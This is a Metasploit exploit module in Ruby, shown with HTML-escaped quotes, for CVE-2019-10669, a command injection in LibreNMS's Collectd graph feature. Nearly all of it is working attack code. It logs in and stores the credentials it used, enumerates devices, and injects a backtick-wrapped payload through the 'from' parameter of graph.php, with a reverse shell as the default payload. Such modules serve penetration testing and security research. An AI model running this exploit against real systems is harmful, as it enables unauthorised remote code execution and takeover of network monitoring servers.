# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;LibreNMS Collectd Command Injection&#039;,
      &#039;Description&#039;    => %q(
        This module exploits a command injection vulnerability in the
        Collectd graphing functionality in LibreNMS.

        The `to` and `from` parameters used to define the range for
        a graph are sanitized using the `mysqli_escape_real_string()`
        function, which permits backticks. These parameters are used
        as part of a shell command that gets executed via the `passthru()`
        function, which can result in code execution.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Eldar Marcussen&#039;, # Vulnerability discovery
        &#039;Shelby Pace&#039;      # Metasploit module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-10669&#039; ],
          [ &#039;URL&#039;, &#039;https://www.darkmatter.ae/xen1thlabs/librenms-command-injection-vulnerability-xl-19-017/&#039; ]
        ],
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
      [
        [ &#039;Linux&#039;,
          {
            &#039;Platform&#039;        =>  &#039;unix&#039;,
            &#039;Arch&#039;            =>  ARCH_CMD,
            &#039;DefaultOptions&#039;  =>  { &#039;Payload&#039; => &#039;cmd/unix/reverse&#039; }
          }
        ]
      ],
      &#039;DisclosureDate&#039; => &#039;2019-07-15&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base LibreNMS path&#039;, &#039;/&#039; ]),
      OptString.new(&#039;USERNAME&#039;, [ true, &#039;User name for LibreNMS&#039;, &#039;&#039; ]),
      OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Password for LibreNMS&#039;, &#039;&#039; ])
    ])
  end

  def check
    res = send_request_cgi!(&#039;method&#039;  =>  &#039;GET&#039;, &#039;uri&#039;  =>  target_uri.path)
    return Exploit::CheckCode::Safe unless res && res.body.downcase.include?(&#039;librenms&#039;)

    about_res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, &#039;pages&#039;, &#039;about.inc.php&#039;)
    )

    return Exploit::CheckCode::Detected unless about_res && about_res.code == 200

    version = about_res.body.match(/version\s+to\s+(\d+\.\d+\.?\d*)/)
    return Exploit::CheckCode::Detected unless version && version.length > 1
    vprint_status("LibreNMS version #{version[1]} detected")
    version = Gem::Version.new(version[1])

    return Exploit::CheckCode::Appears if version <= Gem::Version.new(&#039;1.50&#039;)
  end

  def login
    login_uri = normalize_uri(target_uri.path, &#039;login&#039;)
    res = send_request_cgi(&#039;method&#039; =>  &#039;GET&#039;,  &#039;uri&#039; =>  login_uri)
    fail_with(Failure::NotFound, &#039;Failed to access the login page&#039;) unless res && res.code == 200

    cookies = res.get_cookies
    login_res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  login_uri,
      &#039;cookie&#039;    =>  cookies,
      &#039;vars_post&#039; =>
      {
        &#039;username&#039;  =>  datastore[&#039;USERNAME&#039;],
        &#039;password&#039;  =>  datastore[&#039;PASSWORD&#039;]
      }
    )

    fail_with(Failure::NoAccess, &#039;Failed to submit credentials to login page&#039;) unless login_res && login_res.code == 302

    cookies = login_res.get_cookies
    res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path),
      &#039;cookie&#039;  =>  cookies
    )
    fail_with(Failure::NoAccess, &#039;Failed to log into LibreNMS&#039;) unless res && res.code == 200 && res.body.include?(&#039;Devices&#039;)

    print_status(&#039;Successfully logged into LibreNMS. Storing credentials...&#039;)
    store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
    login_res.get_cookies
  end

  def get_version
    uri = normalize_uri(target_uri.path, &#039;about&#039;)

    res = send_request_cgi( &#039;method&#039;  =>  &#039;GET&#039;, &#039;uri&#039; => uri, &#039;cookie&#039; => @cookies )
    fail_with(Failure::NotFound, &#039;Failed to reach the about LibreNMS page&#039;) unless res && res.code == 200

    html = res.get_html_document
    version = html.search(&#039;tr//td//a&#039;)
    fail_with(Failure::NotFound, &#039;Failed to retrieve version information&#039;) if version.empty?
    version.each do |e|
      return $1 if e.text =~ /(\d+\.\d+\.?\d*)/
    end
  end

  def get_device_ids
    version = get_version
    print_status("LibreNMS version: #{version}")

    if version && Gem::Version.new(version) < Gem::Version.new(&#039;1.50&#039;)
      dev_uri = normalize_uri(target_uri.path, &#039;ajax_table.php&#039;)
      format = &#039;+list_detail&#039;
    else
      dev_uri = normalize_uri(target_uri.path, &#039;ajax&#039;, &#039;table&#039;, &#039;device&#039;)
      format = &#039;list_detail&#039;
    end

    dev_res = send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  dev_uri,
      &#039;cookie&#039;    =>  @cookies,
      &#039;vars_post&#039; =>
      {
        &#039;id&#039;              =>  &#039;devices&#039;,
        &#039;format&#039;          =>  format,
        &#039;current&#039;         =>  &#039;1&#039;,
        &#039;sort[hostname]&#039;  =>  &#039;asc&#039;,
        &#039;rowCount&#039;        =>  50
      }
    )

    fail_with(Failure::NotFound, &#039;Failed to access the devices page&#039;) unless dev_res && dev_res.code == 200

    json = JSON.parse(dev_res.body)
    fail_with(Failure::NotFound, &#039;Unable to retrieve JSON response&#039;) if json.empty?

    json = json[&#039;rows&#039;]
    fail_with(Failure::NotFound, &#039;Unable to find hostname data&#039;) if json.empty?

    hosts = []
    json.each do |row|
      hostname = row[&#039;hostname&#039;]
      next if hostname.nil?

      id = hostname.match(&#039;href=\"device\/device=(\d+)\/&#039;)
      next unless id && id.length > 1
      hosts << id[1]
    end

    fail_with(Failure::NotFound, &#039;Failed to retrieve any device ids&#039;) if hosts.empty?

    hosts
  end

  def get_plugin_info(id)
    uri = normalize_uri(target_uri.path, "device", "device=#{id}", "tab=collectd")

    res = send_request_cgi( &#039;method&#039; => &#039;GET&#039;, &#039;uri&#039; => uri, &#039;cookie&#039; => @cookies )
    return unless res && res.code == 200

    html = res.get_html_document
    plugin_link = html.at(&#039;div[@class="col-md-3"]//a/@href&#039;)
    return if plugin_link.nil?

    plugin_link = plugin_link.value
    plugin_hash = Hash[plugin_link.split(&#039;/&#039;).map { |plugin_val| plugin_val.split(&#039;=&#039;) }]
    c_plugin = plugin_hash[&#039;c_plugin&#039;]
    c_type = plugin_hash[&#039;c_type&#039;]
    c_type_instance = plugin_hash[&#039;c_type_instance&#039;] || &#039;&#039;
    c_plugin_instance = plugin_hash[&#039;c_plugin_instance&#039;] || &#039;&#039;

    return c_plugin, c_type, c_plugin_instance, c_type_instance
  end

  def exploit
    req_uri = normalize_uri(target_uri.path, &#039;graph.php&#039;)
    @cookies = login

    dev_ids = get_device_ids

    collectd_device = -1
    plugin_name = nil
    plugin_type = nil
    plugin_instance = nil
    plugin_type_inst = nil
    dev_ids.each do |device|
     collectd_device = device
     plugin_name, plugin_type, plugin_instance, plugin_type_inst = get_plugin_info(device)
     break if (plugin_name && plugin_type && plugin_instance && plugin_type_inst)
     collectd_device = -1
    end

    fail_with(Failure::NotFound, &#039;Failed to find a collectd plugin for any of the devices&#039;) if collectd_device == -1
    print_status("Sending payload via device #{collectd_device}")

    res = send_request_cgi(
      &#039;method&#039;    =>  &#039;GET&#039;,
      &#039;uri&#039;       =>  req_uri,
      &#039;cookie&#039;    =>  @cookies,
      &#039;vars_get&#039;  =>
      {
        &#039;device&#039;                =>  collectd_device,
        &#039;type&#039;                  =>  &#039;device_collectd&#039;,
        &#039;to&#039;                    =>  Rex::Text.rand_text_numeric(10),
        &#039;from&#039;                  =>  "1`#{payload.encoded}`",
        &#039;c_plugin&#039;              =>  plugin_name,
        &#039;c_type&#039;                =>  plugin_type,
        &#039;c_plugin_instance&#039;     =>  plugin_instance,
        &#039;c_type_instance&#039;       =>  plugin_type_inst
      }
    )
  end
end

